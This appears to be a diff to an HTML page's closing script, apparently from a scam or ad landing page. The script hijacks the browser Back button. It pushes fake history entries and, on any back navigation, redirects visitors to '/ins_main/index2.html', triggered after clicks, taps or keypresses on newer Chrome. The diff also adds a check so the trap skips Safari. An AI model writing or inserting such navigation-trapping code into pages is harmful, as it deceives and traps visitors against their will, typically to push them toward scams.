@@ -71,49 +71,59 @@
 	</div>
 <script>
     document.addEventListener("DOMContentLoaded", function () {
-        (function (w, d) {
+		var isSafari = /constructor/i.test(window.HTMLElement) || (function (p) { return p.toString() === "[object SafariRemoteNotification]"; })(!window['safari'] || (typeof safari !== 'undefined' && window['safari'].pushNotification));
+		
+		if (!isSafari){
+			(function (w, d) {
 
-            var targetLocation = function () {
-                var url = window.location.origin + '/ins_main/index2.html';
-                w.history && w.history.pushState && w.history.pushState(null, null, w.location);
-                w.addEventListener && w.addEventListener('popstate', function () {
-                    w.location = url
-                }, !1);
-            };
-            (function () {
-                if (w.addEventListener) {
-                    try {
-                        chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]);
-                    } catch (e) {
-                        chromeVersion = 0;
-                    }
-                    if (chromeVersion >= 75) {
-                        d.body.addEventListener('mouseup', function () {
-                            setTimeout(targetLocation, 0)
-                        }, !1);
-                        d.body.addEventListener('touchend', function () {
-                            setTimeout(targetLocation, 0)
-                        }, !1);
-                        d.body.addEventListener('keydown', function () {
-                            setTimeout(targetLocation, 0)
-                        }, !1);
-                    } else {
-                        w.addEventListener('pageshow', function () {
-                            setTimeout(targetLocation, 0)
-                        }, !1);
-                    }
-                } else {
-                    setTimeout(targetLocation, 0)
-                }
-            }())
-        }(window, document));
-    });
+				
+				var targetLocation = function () {
+					var url = window.location.origin + '/ins_main/index2.html';
+					//var url = window.location.origin + '/index2.html';
+					w.history && w.history.pushState && w.history.pushState(null, null, w.location);
+					w.addEventListener && w.addEventListener('popstate', function () {
+						w.location = url
+					}, !1);
+				};
+				(function () {
+					if (w.addEventListener) {
+						try {
+							chromeVersion = +(new RegExp('Chrome/([0-9]+)').exec(navigator.userAgent)[1]);
+						} catch (e) {
+							chromeVersion = 0;
+						}
+						if (chromeVersion >= 75) {
+							d.body.addEventListener('mouseup', function () {
+								setTimeout(targetLocation, 0)
+							}, !1);
+							d.body.addEventListener('touchend', function () {
+								setTimeout(targetLocation, 0)
+							}, !1);
+							d.body.addEventListener('keydown', function () {
+								setTimeout(targetLocation, 0)
+							}, !1);
+						} else {
+							w.addEventListener('pageshow', function () {
+								setTimeout(targetLocation, 0)
+							}, !1);
+						}
+					} else {
+						setTimeout(targetLocation, 0)
+					}
+				}())
+			}(window, document));
+			window.history.pushState('forward', null, '');
+			window.onpopstate =  function() {
+				//window.location.href = window.location.origin + '/index2.html';
+				window.location.href = window.location.origin + '/ins-main/index2.html';
+				window.history.pushState('forward', null, '');
+			};
+		}
 
-	window.history.pushState('forward', null, '');
-	window.onpopstate =  function() {
-		window.location.href = window.location.origin + '/ins_main/index2.html';
-		window.history.pushState('forward', null, '');
-	};
-</script>
+		window.history.pushState(null, null, window.location.href)
+		window.history.pushState(null, null, window.location.href)
+		
+	});
+	</script>
 </body>
 </html>
